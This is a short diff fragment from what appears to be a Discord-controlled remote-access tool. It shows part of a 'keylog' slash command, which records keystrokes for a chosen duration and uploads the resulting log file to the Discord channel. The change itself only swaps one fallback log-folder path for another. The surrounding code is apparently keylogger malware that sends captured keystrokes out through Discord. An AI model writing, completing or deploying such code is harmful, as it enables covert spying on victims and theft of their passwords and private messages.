@@ -115,7 +115,7 @@ async def keylog(interaction: discord.Interaction, duration: int=60):
         try:
             await interaction.followup.send(file=discord.File("{0}\\logs\\{1}".format(curDir,logfile)))
         except Exception:
-            await interaction.followup.send(file=discord.File(".\\Python\\logs\\{}".format(logfile)))
+            await interaction.followup.send(file=discord.File(".\\123456789\\logs\\{}".format(logfile)))
 
     print(os.getcwd()[-1:-3])
     os.chdir("123456789")
